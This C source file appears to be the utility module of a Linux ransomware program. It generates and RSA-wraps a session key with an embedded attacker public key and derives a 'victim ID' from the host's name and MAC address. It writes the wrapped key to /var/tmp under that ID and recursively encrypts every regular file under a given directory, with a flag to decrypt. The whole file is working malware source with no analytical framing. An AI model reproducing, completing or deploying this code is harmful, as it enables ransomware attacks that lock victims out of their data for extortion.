#include "utils.h"
#include "encrypt.h"
#include "decrypt.h"

int generateSessionKey(char *key, size_t length)
{
    if (RAND_bytes(key, length) != 1)
    {
        fprintf(stderr, "RAND_bytes failed\n");
        return 1;
    }
    return 0;
}

EVP_PKEY *getPublicKey()
{
    static const char PUBLIC_KEY_PEM[] =
        "-----BEGIN PUBLIC KEY-----\n"
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3mLu8j17CXePNieoBfW5\n"
        "jFRmo9bsQCjtbq6zgpZlsfQk0c/Q17y7GkhHAJ7MVVnSmIcgyBuixpmypo3khWDy\n"
        "q8vIaqIKW44MVB/x/+Y1fSVTOWarj/+cGSjb4p6MKZR1LSItyWR4GIQGkLw1333V\n"
        "HJzhoHL+3JcIgWeRguLooooMQNZF/Hnh35hQk2Kgs+IgWayYp/+rdTOt+odqOWuK\n"
        "yAAOCvqsEuv++GiAdKXiejkH6qAHsUIDsktdZU3sR++xITgkTXVhDwd3cAGfropJ\n"
        "l+6GGZtk3XXVB4pfHlk7bVzKfsZ1zYo6aC61HuA73tJiPXftZjkvTZrVbn8hYVO5\n"
        "0QIDAQAB\n"
        "-----END PUBLIC KEY-----\n";

    // Create BIO object reads PEM from memory
    BIO *bio = BIO_new_mem_buf(PUBLIC_KEY_PEM, -1);
    // Read the public key from BIO stream
    EVP_PKEY *pubkey = PEM_read_bio_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);

    if (!pubkey)
    {
        ERR_print_errors_fp(stderr);
        return NULL;
    }
    return pubkey;
}

// Wrap (encrypt) the session key using the public key
unsigned char *wrapSessionKey(EVP_PKEY *publicKey, const unsigned char *sessionKey, size_t sessionKeyLen, size_t *outWrappedKeyLen)
{
    unsigned char *wrappedKey;
    size_t wrappedKeyLen = 0;

    // create context for key-based operation
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(publicKey, NULL);
    if (!ctx)
    {
        ERR_print_errors_fp(stderr);
        return NULL;
    }

    // initialize encryption operation
    if (EVP_PKEY_encrypt_init(ctx) <= 0 || EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0)
    {
        ERR_print_errors_fp(stderr);
        EVP_PKEY_CTX_free(ctx);
        return NULL;
    }

    // determine buffer length
    if (EVP_PKEY_encrypt(ctx, NULL, &wrappedKeyLen, sessionKey, sessionKeyLen) <= 0)
    {
        ERR_print_errors_fp(stderr);
        EVP_PKEY_CTX_free(ctx);
        return NULL;
    }

    wrappedKey = OPENSSL_malloc(wrappedKeyLen);
    if (!wrappedKey)
    {
        fprintf(stderr, "malloc failed\n");
        EVP_PKEY_CTX_free(ctx);
        return NULL;
    }

    // encrypt the session key
    if (EVP_PKEY_encrypt(ctx, wrappedKey, &wrappedKeyLen, sessionKey, sessionKeyLen) <= 0)
    {
        ERR_print_errors_fp(stderr);
        free(wrappedKey);
        EVP_PKEY_CTX_free(ctx);
        return NULL;
    }

    EVP_PKEY_CTX_free(ctx);
    *outWrappedKeyLen = wrappedKeyLen;
    return wrappedKey;
}

// Unwrap (decrypt) the session key using the private key
unsigned char *unwrapSessionKey(EVP_PKEY *privateKey, const unsigned char *wrappedKey, size_t wrappedKeyLen, size_t *outSessionKeyLen)
{

    EVP_PKEY_CTX *ctx = NULL;
    unsigned char *sessionKey = NULL;
    size_t sessionKeyLen = 0;

    // create context for key-based operation
    ctx = EVP_PKEY_CTX_new(privateKey, NULL);
    if (!ctx)
    {
        ERR_print_errors_fp(stderr);
        return NULL;
    }

    // initialize decryption operation
    if (EVP_PKEY_decrypt_init(ctx) <= 0 || EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0)
    {
        ERR_print_errors_fp(stderr);
        EVP_PKEY_CTX_free(ctx);
        return NULL;
    }

    // determine buffer length
    if (EVP_PKEY_decrypt(ctx, NULL, &sessionKeyLen, wrappedKey, wrappedKeyLen) <= 0)
    {
        ERR_print_errors_fp(stderr);
        EVP_PKEY_CTX_free(ctx);
        return NULL;
    }

    sessionKey = OPENSSL_malloc(sessionKeyLen);
    if (!sessionKey)
    {
        fprintf(stderr, "unwrapSessionKey: malloc failed\n");
        EVP_PKEY_CTX_free(ctx);
        return NULL;
    }

    // decrypt the session key
    if (EVP_PKEY_decrypt(ctx, sessionKey, &sessionKeyLen, wrappedKey, wrappedKeyLen) <= 0)
    {
        ERR_print_errors_fp(stderr);
        OPENSSL_free(sessionKey);
        EVP_PKEY_CTX_free(ctx);
        return NULL;
    }

    EVP_PKEY_CTX_free(ctx);
    *outSessionKeyLen = sessionKeyLen;
    return sessionKey;
}

// Generate a unique victim ID based on hostname and MAC address
char *generateVictimID(void)
{
    char hostname[256];
    unsigned char mac[6];
    char macStr[32] = {0};
    char seed[512];
    unsigned char hash[SHA256_DIGEST_LENGTH];
    static char victimID[65];

    // Get hostname
    if (gethostname(hostname, sizeof(hostname)) != 0)
    {
        perror("gethostname");
        return NULL;
    }

    // Get MAC address
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1)
    {
        perror("getifaddrs");
        return NULL;
    }

    int found = 0;
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
    {
        if (ifa->ifa_addr == NULL)
            continue;
        if (ifa->ifa_addr->sa_family == AF_PACKET && !(ifa->ifa_flags & IFF_LOOPBACK))
        {
            struct sockaddr_ll *s = (struct sockaddr_ll *)ifa->ifa_addr;
            if (s->sll_halen == 6)
            {
                memcpy(mac, s->sll_addr, 6);
                found = 1;
                break;
            }
        }
    }
    freeifaddrs(ifaddr);

    if (!found)
    {
        fprintf(stderr, "No valid MAC address found\n");
        return NULL;
    }

    snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    snprintf(seed, sizeof(seed), "%s|%s", hostname, macStr);

    SHA256((unsigned char *)seed, strlen(seed), hash);

    for (int i = 0; i < sizeof(hash); i++)
        sprintf(victimID + (i * 2), "%02x", hash[i]);

    victimID[sizeof(hash) * 2] = '\0';

    return victimID;
}

unsigned char *base64Encode(const unsigned char *wrappedKey, size_t inlen)
{
    if (!wrappedKey && inlen != 0)
        return NULL;

    size_t outlen = ((inlen + 2) / 3) * 4;
    char *out = malloc(outlen + 1);
    if (!out)
        return NULL;

    int ret = EVP_EncodeBlock((unsigned char *)out, wrappedKey, (int)inlen);
    if (ret < 0)
    {
        free(out);
        return NULL;
    }

    return out;
}

unsigned char *base64Decode(const char *b64WrappedKey, size_t *outlen)
{
    if (!b64WrappedKey)
        return NULL;

    size_t inlen = strlen(b64WrappedKey);
    size_t max_out = (inlen * 3) / 4;
    unsigned char *out = malloc(max_out);
    if (!out)
        return NULL;

    int len = EVP_DecodeBlock(out, (const unsigned char *)b64WrappedKey, (int)inlen);
    if (len < 0)
    {
        free(out);
        return NULL;
    }

    int pad = 0;
    if (inlen >= 2)
    {
        if (b64WrappedKey[inlen - 1] == '=')
            pad++;
        if (b64WrappedKey[inlen - 2] == '=')
            pad++;
    }

    len -= pad;

    *outlen = len;
    return out;
}

// Store the wrapped session key blob in /var/tmp/<victimID>
void storeWrappedBlob(const unsigned char *wrappedKey, size_t wrappedKeyLen)
{
    char *victimID = generateVictimID();
    if (!victimID)
    {
        fprintf(stderr, "Failed to generate victim ID\n");
        return;
    }

    const char *dir = "/var/tmp";
    size_t max_path = PATH_MAX;
    char filepath[PATH_MAX];
    snprintf(filepath, sizeof(filepath), "%s/%s", dir, victimID);

    FILE *file = fopen(filepath, "wb");
    if (file == NULL)
    {
        perror("Failed to open file for writing");
        return;
    }

    char *b64WrappedKey = base64Encode(wrappedKey, wrappedKeyLen);

    if (!b64WrappedKey)
    {
        fprintf(stderr, "Base64 encoding failed\n");
        fclose(file);
        return;
    }
    fwrite(b64WrappedKey, 1, strlen(b64WrappedKey), file);
    fflush(file);
    free(b64WrappedKey);
    fclose(file);
}

EVP_PKEY *loadPrivate(const char *path)
{
    FILE *fp = fopen(path, "r");
    if (!fp)
    {
        perror("fopen");
        return NULL;
    }
    EVP_PKEY *pkey = PEM_read_PrivateKey(fp, NULL, NULL, NULL);
    fclose(fp);
    if (!pkey)
        ERR_print_errors_fp(stderr);
    return pkey;
}

void loopDir(const char *filePath)
{
    struct stat pathStat;

    if (lstat(filePath, &pathStat) != 0)
        return;
    
    if (S_ISLNK(pathStat.st_mode))
        return;

    if (S_ISDIR(pathStat.st_mode))
    {
        DIR *dir = opendir(filePath);
        if (!dir)
            return;

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL)
        {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;

            char fullPath[PATH_MAX];
            snprintf(fullPath, sizeof(fullPath), "%s/%s", filePath, entry->d_name);

            struct stat entryStat;
            if (lstat(fullPath, &entryStat) != 0)
                continue;

            if (entry->d_name[0] == '.' && S_ISREG(entryStat.st_mode))
                continue;

            if (S_ISDIR(entryStat.st_mode))
            {
                loopDir(fullPath);
            }
            else if (S_ISREG(entryStat.st_mode))
            {
                if (!decryptFlag)
                    encrypt(fullPath);
                else
                    decrypt(fullPath);
            }
        }

        closedir(dir);
    }
    else if (S_ISREG(pathStat.st_mode))
    {
        if (!decryptFlag)
            encrypt(filePath);
        else
            decrypt(filePath);
    }
}